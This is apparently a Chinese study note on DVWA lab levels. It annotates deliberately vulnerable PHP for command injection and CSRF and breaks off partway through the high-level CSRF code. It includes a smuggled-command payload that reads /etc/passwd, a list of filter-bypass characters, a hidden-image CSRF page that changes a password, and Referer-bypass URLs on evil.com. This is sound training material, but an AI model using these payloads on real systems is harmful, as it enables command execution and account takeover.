## Command Injection(命令注入漏洞)
攻击者可通过未过滤的用户输入执行系统命令
### low
```php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {    #是否点击Submit按钮
    
    // 获取输入
    $target = $_REQUEST[ 'ip' ];
    
    // 判断当前服务器操作系统
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { #不区分大小写查找Windows NT子串
        
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );  #执行ping命令
    }
    //$target 被当作命令的一部分，而不是参数
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    $html .= "<pre>{$cmd}</pre>";   #命令结果原样输出到页面
}
?>
```
⚠️
1. 直接获取用户输入，无过滤
2. 把用户输入直接拼接到系统命令中执行
3. 命令输出直接回显
payload:
`127.0.0.1; cat /etc/passwd`
会执行为ping  -c 4 127.0.0.1; cat /etc/passwd
### medium
```php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    $target = $_REQUEST[ 'ip' ];
    
    //增加&&和;的过滤
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );


    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    $html .= "<pre>{$cmd}</pre>";
}
?>
```
相较于low，唯独增加了一定的过滤
删除了 `&&` 和 `;`
然而剩下 `|`、`||`、`&`、`` ` ``、`$()`、换行全都能用

## CSRF
CSRF（Cross-Site Request Forgery，跨站请求伪造）。利用用户已登录状态，诱骗浏览器向受信任网站发送伪造请求，常导致转账、改密等敏感操作被冒用。
攻击体条件：
① 受害者已登录目标站点（浏览器里有有效的 PHPSESSID）
② 攻击者能让受害者的浏览器发起一个请求
③ 服务端只凭 Cookie 判断身份，不校验请求来源
### low
```php
<?php
if( isset( $_GET[ 'Change' ] ) ) {
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    if( $pass_new == $pass_conf ) {
        //SQL转义（防注入）
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        
        $pass_new = md5( $pass_new );
        
        // 从 Session 里取"当前登录用户"
        $current_user = dvwaCurrentUser();
        
        //拼接update语句
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // 提示修改成功
        $html .= "<pre>Password Changed.</pre>";
    }
    
    //两次密码不匹配
    else {
        $html .= "<pre>Passwords did not match.</pre>";
    }
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
⚠️问题：
1. GET方式：攻击者能用`<img>`、`<script>`、`<iframe>`、`<link>`等多种载体
2. 无CSRF Token，服务端无法区分用户本人提交和第三方页面伪造
3. 不验证当前密码，即不需要知道旧密码就能改
#### 通过`<img>`标签攻击
```html
<html>
<body>
  <h1>Loading...</h1>
  <img src="http://localhost:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
       style="display:none">
</body>
</html>
```
保存为 `csrf.html`，用 HTTP 服务器托管：
```powershell
# 在 csrf.html 所在目录
python -m http.server 8000
```
然后让受害者访问：
`http://localhost:8000/csrf.html`

medium唯一增加了referer检查，但：
`Referer` 是浏览器发的请求头，不是服务器能验证的东西。
- 攻击者完全可以通过构造自己的 URL 让它"看起来像"
- 某些场景下（重定向、旧浏览器）可以伪造
- 用户隐私设置可以关闭 Referer（此时检查反而误伤正常用户）
#### 绕过方法
把目标域名塞进攻击 URL 的路径里
假设目标是 `bank.com`，攻击者没有 bank.com 的域名，但可以这样构造：
`http://evil.com/bank.com/csrf.html`
浏览器发送的 Referer 是：
`Referer: http://evil.com/bank.com/csrf.html`
`stripos("http://evil.com/bank.com/csrf.html", "bank.com")` → 找到 → **通过**。

同理还可以用 Query：
`http://evil.com/?ref=bank.com`

子域名控制技巧，如果攻击者能控制 `bank.com.evil.com` 的 DNS，Referer 是：
`http://bank.com.evil.com/csrf.html`
子串里包含 `bank.com` → 通过。
### high
```php
<?php
//三个状态变量
$change = false;  #是否可以改密码
$request_type = "html";   #请求类型：html（表单） / json（API）
$return_message = "Request Failed";

//  判断是不是 JSON 请求
//    - 必须是 POST
//    - 必须带 CONTENT_TYPE 头
//    - 且 CONTENT_TYPE 必须严格等于 "application/json"
if ($_SERVER['REQUEST_METHOD'] == "POST" && array_key_exists ("CONTENT_TYPE", $_SERVER) && $_SERVER['CONTENT_TYPE'] == "application/json") {

// 从原始请求体读取 JSON 并解析成关联数组  php://input 是"未解析的原始 body"
    $data = json_decode(file_get_contents('php://input'), true);
    $request_type = "json";
    
 // JSON 模式下，token 从【请求头】取     HTTP_USER_TOKEN 是 PHP 对 HTTP 头 "User-Token" 的映射命名
    if (array_key_exists("HTTP_USER_TOKEN", $_SERVER) &&
        array_key_exists("password_new", $data) &&
        array_key_exists("password_conf", $data) &&
        array_key_exists("Change", $data)) {
        $token = $_SERVER['HTTP_USER_TOKEN'];
        $pass_new = $data["password_new"];
        $pass_conf = $data["password_conf"];
        $change = true;
    }
} else {   //非json，走传统表单/url参数    $_REQUEST 会合并 GET / POST（默认不含 COOKIE）
    if (array_key_exists("user_token", $_REQUEST) &&
        array_key_exists("password_new", $_REQUEST) &&
        array_key_exists("password_conf", $_REQUEST) &&
        array_key_exists("Change", $_REQUEST)) {
        $token = $_REQUEST["user_token"];
        $pass_new = $_REQUEST["password_new"];
        $pass_conf = $_REQUEST["password_conf"];
        $change = true;
    }
}
```
